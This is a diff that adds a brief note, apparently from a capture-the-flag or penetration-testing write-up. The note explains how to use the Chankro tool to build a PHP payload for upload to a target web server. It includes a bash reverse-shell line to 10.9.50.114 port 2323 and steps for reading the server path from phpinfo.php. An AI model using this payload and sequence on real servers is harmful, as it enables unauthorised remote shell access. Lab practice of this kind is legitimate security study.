@@ -1,0 +1,16 @@
+
+
+go to phpinfo.php and copy the path of root documents and also the archticture to put in this command to genereate shell for that specific platform.
+
+
+$ chankro --arch 64 --input shell --output random.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
+
+	where:
+		1. 64 is archticture of that platform
+		2. shell is file where is exact shell contain
+					eg, bash -c 'exec bash -i &>/dev/tcp/10.9.50.114/2323 <&1'
+		3. random.php is a payload which we have to upload inorder to get reverse connection and it will generate by the tool
+		4. and at last we need to put path of Documents root which we got from phpinfo.php from the target site 
+
+
+
